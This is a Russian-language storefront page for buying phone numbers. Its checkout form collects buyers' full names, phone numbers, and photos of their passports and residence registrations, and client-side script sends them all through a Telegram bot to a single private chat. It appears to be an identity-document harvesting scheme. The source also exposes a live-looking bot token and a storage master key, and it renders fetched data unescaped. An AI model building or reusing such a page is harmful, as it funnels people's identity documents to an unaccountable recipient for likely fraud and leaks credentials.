<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SIM MARKET | ОФОРМЛЕНИЕ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap');
        body { background: #09090b; color: #f4f4f5; font-family: 'Manrope', sans-serif; }
        .glass { background: rgba(24, 24, 27, 0.9); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.08); }
        .gold-text { background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; transition: 0.2s; }
        .input-dark { background: #18181b; border: 1px solid #27272a; border-radius: 12px; padding: 12px; width: 100%; color: white; outline: none; font-size: 14px; }
        .tab-btn { transition: 0.3s; white-space: nowrap; font-size: 10px; font-weight: 800; text-transform: uppercase; }
        .tab-active { background: #fbbf24 !important; color: #000 !important; }
        #order-modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.9); align-items: center; justify-content: center; padding: 20px; overflow-y: auto; }
        .file-box { background: #18181b; border: 1px dashed #27272a; border-radius: 12px; padding: 10px; }
    </style>
</head>
<body class="pb-10">

    <header class="p-6 sticky top-0 z-50 glass border-b border-white/5">
        <h1 class="text-xl font-extrabold uppercase tracking-tighter">SIM <span class="gold-text">MARKET</span></h1>
    </header>

    <main class="max-w-2xl mx-auto p-4">
        <input type="text" id="q" oninput="draw()" placeholder="Поиск номера..." class="w-full p-5 mb-6 rounded-2xl bg-zinc-900 border border-zinc-800 outline-none text-sm">

        <div class="flex gap-2 overflow-x-auto no-scrollbar mb-8 pb-2">
            <button onclick="setFilter('all', this)" class="tab-btn tab-active px-6 py-2.5 rounded-full border border-white/10 bg-zinc-900">Все</button>
            <button onclick="setFilter('mts', this)" class="tab-btn px-6 py-2.5 rounded-full border border-white/10 bg-zinc-900">МТС</button>
            <button onclick="setFilter('megafon', this)" class="tab-btn px-6 py-2.5 rounded-full border border-white/10 bg-zinc-900">Мегафон</button>
            <button onclick="setFilter('beeline', this)" class="tab-btn px-6 py-2.5 rounded-full border border-white/10 bg-zinc-900">Билайн</button>
            <button onclick="setFilter('tele2', this)" class="tab-btn px-6 py-2.5 rounded-full border border-white/10 bg-zinc-900">Теле2</button>
            <button onclick="setFilter('yota', this)" class="tab-btn px-6 py-2.5 rounded-full border border-white/10 bg-zinc-900">Yota</button>
        </div>

        <div id="list" class="space-y-4"></div>
    </main>

    <div id="order-modal">
        <div class="glass w-full max-w-sm p-6 rounded-[2.5rem] space-y-4 my-auto">
            <div class="flex justify-between items-center">
                <h2 class="font-black uppercase text-[10px] tracking-widest">Оформление: <span id="target-num" class="gold-text"></span></h2>
                <button onclick="closeModal()" class="w-8 h-8 bg-zinc-800 rounded-full text-xs">✕</button>
            </div>
            
            <input type="text" id="client-fio" placeholder="ФИО полностью" class="input-dark">
            <input type="tel" id="client-phone" placeholder="Ваш номер для связи" class="input-dark">
            
            <div class="file-box">
                <label class="block text-[9px] uppercase font-bold opacity-40 mb-1">Фото паспорта (лицо)</label>
                <input type="file" id="client-passport" accept="image/*" class="text-[9px] text-zinc-500 file:bg-amber-500/10 file:text-amber-500 file:border-0 file:px-2 file:rounded file:mr-2">
            </div>

            <div class="file-box">
                <label class="block text-[9px] uppercase font-bold opacity-40 mb-1">Фото прописки</label>
                <input type="file" id="client-prodiska" accept="image/*" class="text-[9px] text-zinc-500 file:bg-amber-500/10 file:text-amber-500 file:border-0 file:px-2 file:rounded file:mr-2">
            </div>

            <button onclick="submitOrder()" id="send-btn" class="w-full py-4 bg-amber-500 text-black font-black rounded-2xl uppercase text-[10px] tracking-widest active:scale-95 transition-all">Отправить заявку</button>
        </div>
    </div>

    <script>
        const TOKEN = "8279695581:AAGuQgQhmgq9QaTX4rULywq6o18MeT3XIUw";
        const MY_ID = "8768514374"; 
        const BIN = "69c9d640aaba882197a65742"; 
        const KEY = "$2a$10$BIVZfOXmYVaG9NpPRW61Le//5yePRuieGl/ph3o6UYlHw4uOJQKtW"; 

        let db = [], currentNum = "", currentPrice = "", activeFilter = 'all';

        async function init() {
            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN}/latest`, { headers: {'X-Master-Key': KEY} });
            const data = await res.json();
            db = data.record.record || data.record;
            draw();
        }

        function setFilter(val, btn) {
            activeFilter = val;
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
            btn.classList.add('tab-active');
            draw();
        }

        function draw() {
            const q = document.getElementById('q').value.toLowerCase();
            let filtered = db.filter(i => {
                const mSearch = String(i.n).includes(q);
                const mTab = activeFilter === 'all' || String(i.op).toLowerCase() === activeFilter;
                return mSearch && mTab;
            });
            document.getElementById('list').innerHTML = filtered.map(i => `
                <div class="card p-6 flex justify-between items-center border-white/5">
                    <div>
                        <div class="text-2xl font-black">${i.n}</div>
                        <div class="text-[9px] opacity-40 uppercase font-bold mt-1">${i.op} • ${i.t} ₽</div>
                    </div>
                    <button onclick="openModal('${i.n}', '${i.t}')" class="bg-amber-500 text-black text-[10px] font-black px-5 py-2.5 rounded-xl uppercase">Купить</button>
                </div>
            `).reverse().join('');
        }

        function openModal(n, t) {
            currentNum = n; currentPrice = t;
            document.getElementById('target-num').innerText = n;
            document.getElementById('order-modal').style.display = 'flex';
        }

        function closeModal() { document.getElementById('order-modal').style.display = 'none'; }

        async function submitOrder() {
            const fio = document.getElementById('client-fio').value;
            const phone = document.getElementById('client-phone').value;
            const passImg = document.getElementById('client-passport').files[0];
            const propImg = document.getElementById('client-prodiska').files[0];
            const btn = document.getElementById('send-btn');

            if(!fio || !phone) return alert("Заполните ФИО и контактный номер");
            if(!passImg || !propImg) return alert("Прикрепите оба фото (паспорт и прописка)");

            btn.innerText = "ОТПРАВКА..."; btn.disabled = true;

            try {
                // 1. Текст
                const msg = `🚀 *ЗАКАЗ SIM*\n📱 Номер: \`${currentNum}\`\n💰 Цена: ${currentPrice} ₽\n👤 Клиент: ${fio}\n📞 Связь: ${phone}`;
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: MY_ID, text: msg, parse_mode: 'Markdown' })
                });

                // 2. Фото паспорта
                const fd1 = new FormData();
                fd1.append('chat_id', MY_ID);
                fd1.append('photo', passImg);
                fd1.append('caption', `Паспорт: ${fio}`);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });

                // 3. Фото прописки
                const fd2 = new FormData();
                fd2.append('chat_id', MY_ID);
                fd2.append('photo', propImg);
                fd2.append('caption', `Прописка: ${fio}`);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd2 });

                alert("Все данные отправлены! Курбан свяжется с вами.");
                closeModal();
            } catch (e) {
                alert("Ошибка при отправке.");
            } finally {
                btn.innerText = "Отправить заявку"; btn.disabled = false;
            }
        }
        init();
    </script>
</body>
</html>
